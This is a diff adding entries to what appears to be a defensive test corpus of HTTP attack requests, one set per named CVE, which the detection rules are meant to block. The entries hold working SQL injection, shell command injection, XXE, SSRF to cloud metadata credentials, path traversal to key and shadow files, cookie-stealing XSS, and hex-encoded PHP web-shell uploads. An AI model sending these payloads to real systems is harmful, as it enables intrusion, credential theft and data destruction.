@@ -5437,3 +5437,84 @@ GET /api/v1/reporting/members/export?projects=1%20UNION%20SELECT%20password%20FR
 #     a caller-selected currentpath or uploadPath. ---
 POST /panel/controllers/save_photo.php header="Content-Type: multipart/form-data; boundary=X" bodyhex=2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d227065726d697373696f6e220d0a0d0a310d0a2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2275706c6f616450617468220d0a0d0a2e2e2f2e2e2f2e2e2f2e2e2f7661722f7777772f68746d6c0d0a2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d227368656c6c2e706870220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0d0a2d2d582d2d0d0a
 POST /panel/upload.php header="Content-Type: multipart/form-data; boundary=X" bodyhex=2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d227065726d697373696f6e220d0a0d0a310d0a2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2275706c6f616450617468220d0a0d0a2e2e2f2e2e2f2e2e2f2e2e2f7661722f7777772f68746d6c0d0a2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d227368656c6c2e706870220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0d0a2d2d582d2d0d0a
+
+# --- 2026-11-11 delta intake: request-shaped CVEs stopped by the class rules. ---
+
+# --- CVE-2026-67449 (Portabase): the TUS upload webhook joins the uploaded
+#     filename into the private data directory, so traversal overwrites the
+#     master key. ---
+POST /api/tus/hooks header="Content-Type: application/json" body="{\"type\":\"post-finish\",\"event\":{\"upload\":{\"metadata\":{\"filename\":\"../../keys/master_key.bin\"}}}}"
+
+# --- CVE-2026-107662 (Revive Adserver): banner-zone.php and campaign-zone.php
+#     read identifiers through inconsistent request-input precedence, so a
+#     different attacker-controlled value reaches the SQL query. ---
+GET /admin/banner-zone.php?clientid=1&campaignid=1%20UNION%20SELECT%20username,password%20FROM%20users--%20-
+GET /admin/campaign-zone.php?clientid=1&campaignid=1%27%3B%20SELECT%20pg_sleep%285%29--%20-
+
+# --- CVE-2026-67546 (Heym): POST /api/mcp/fetch-tools accepts the stdio
+#     transport and runs an attacker-supplied command before MCP validation. ---
+POST /api/mcp/fetch-tools header="Content-Type: application/json" body="{\"command\":\"/bin/sh\",\"args\":[\"-c\",\"id\"],\"transport\":\"stdio\"}"
+
+# --- CVE-2026-107356 (USGS ARMI): the upload handler accepts any file and
+#     stores it under /uploads, so a PHP filename becomes executable. ---
+POST /uploads header="Content-Type: multipart/form-data; boundary=X" bodyhex=2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d227368656c6c2e706870220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0d0a2d2d582d2d0d0a
+
+# --- CVE-2026-121371 (Arista EOS eAPI): the service reads caller-selected
+#     files from the switch filesystem. ---
+POST /command-api header="Content-Type: application/json" body="{\"jsonrpc\":\"2.0\",\"method\":\"runCmds\",\"params\":{\"cmds\":[\"show file /etc/passwd\"],\"format\":\"text\"},\"id\":1}"
+POST /command-api header="Content-Type: application/json" body="{\"jsonrpc\":\"2.0\",\"method\":\"runCmds\",\"params\":{\"cmds\":[\"show file ../../../../etc/shadow\"],\"format\":\"text\"},\"id\":1}"
+
+# --- CVE-2026-125391 (Webmin): samba/save_euser.cgi passes the opts value
+#     through backquote_logged, so a shell separator executes a command. ---
+POST /samba/save_euser.cgi header="Content-Type: application/x-www-form-urlencoded" body="user=alice&opts=;id"
+POST /samba/save_euser.cgi header="Content-Type: application/x-www-form-urlencoded" body="user=alice&opts=%60cat%20%2Fetc%2Fpasswd%60"
+
+# --- CVE-2026-126499 (Jellyfin): the virtual-folder delete and create
+#     endpoints accept a library name that escapes the library directory. ---
+DELETE /Library/VirtualFolders?name=../../media&refreshLibrary=false
+POST /Library/VirtualFolders/Name?name=..%2f..%2fdata header="Content-Type: application/json" body="{\"name\":\"../../data\",\"path\":\"/media\"}"
+
+# --- CVE-2026-105153 (Apache Roller): the AtomPub entry parser resolves
+#     external entities and external DTD subsets before authorization. ---
+POST /roller-services/atom/entries header="Content-Type: application/atom+xml" body="<?xml version=\"1.0\"?><!DOCTYPE entry [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><entry><title>&xxe;</title></entry>"
+POST /roller-services/atom/entries header="Content-Type: application/atom+xml" body="<?xml version=\"1.0\"?><!DOCTYPE entry [<!ENTITY % xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">%xxe;]><entry><title>x</title></entry>"
+
+# --- CVE-2026-125759 (Nango): the orchestrator interpolates the task group
+#     key into a Postgres NOTIFY statement, allowing stacked statements. ---
+POST /v1/immediate header="Content-Type: application/json" body="{\"group\":{\"key\":\"daily'; SELECT pg_sleep(5)--\"}}"
+POST /v1/immediate header="Content-Type: application/json" body="{\"group\":{\"key\":\"x'; DROP TABLE scheduler_jobs;--\"}}"
+
+# --- CVE-2026-107240 (Versa VOS): /authenticate passes the username to
+#     child_process.exec after a sanitizer that leaves newlines intact. ---
+POST /authenticate header="Content-Type: application/x-www-form-urlencoded" body="username=admin%0aid&password=x"
+POST /authenticate header="Content-Type: application/x-www-form-urlencoded" body="username=admin%0a/bin/sh&password=x"
+
+# --- CVE-2026-122095 (AsiaInfo BSS): the menu icon upload stores an SVG
+#     file with embedded JavaScript that runs from the application origin. ---
+POST /bss/sysmgnt/api/menu/icon/upload header="Content-Type: multipart/form-data; boundary=X" bodyhex=2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d2269636f6e2e737667220d0a436f6e74656e742d547970653a20696d6167652f7376672b786d6c0d0a0d0a3c73766720786d6c6e733d22687474703a2f2f7777772e77332e6f72672f323030302f737667223e3c7363726970743e616c65727428646f63756d656e742e636f6f6b6965293c2f7363726970743e3c2f7376673e0d0a2d2d582d2d0d0a
+
+# --- CVE-2026-65971 (Livewire PowerGrid): the public sortDirection property
+#     is interpolated into a raw ORDER BY clause. ---
+POST /livewire/update header="Content-Type: application/json" body="{\"components\":[{\"snapshot\":\"{}\",\"updates\":{\"sortDirection\":\"asc; SELECT pg_sleep(5)--\"},\"calls\":[]}]}"
+
+# --- CVE-2026-65967 (Fider): a webhook URL is fetched by the server without
+#     restricting the destination. ---
+POST /api/webhooks header="Content-Type: application/json" body="{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}"
+
+# --- CVE-2026-67542 (Heym): POST /api/mcp/fetch-tools fetches a caller URL
+#     through the SSE and streamable HTTP transports without a destination
+#     guard. ---
+POST /api/mcp/fetch-tools header="Content-Type: application/json" body="{\"url\":\"http://169.254.169.254/latest/meta-data/\",\"transport\":\"sse\"}"
+
+# --- CVE-2026-63651 (LiveDocs): fetch_docs passes a caller URL straight to
+#     URLSession, including metadata and internal targets. ---
+POST /mcp header="Content-Type: application/json" body="{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/call\",\"params\":{\"name\":\"fetch_docs\",\"arguments\":{\"url\":\"http://169.254.169.254/latest/meta-data/\"}}}"
+
+# --- CVE-2026-64670 (Waline): the comment preview renders raw HTML, so a
+#     comment carrying an event-handler payload runs for a moderator. ---
+POST /api/comment header="Content-Type: application/json" body="{\"comment\":\"<img src=x onerror=alert(document.cookie)>\"}"
+
+# --- CVE-2026-103980 (ideon): safeFetch misses IPv6 transition addresses that
+#     embed private or metadata IPv4 targets. ---
+POST /api/links header="Content-Type: application/json" body="{\"url\":\"http://[64:ff9b::a9fe:a9fe]/latest/meta-data/\"}"
+POST /api/links header="Content-Type: application/json" body="{\"url\":\"http://[2002:a9fe:a9fe::]/latest/meta-data/\"}"
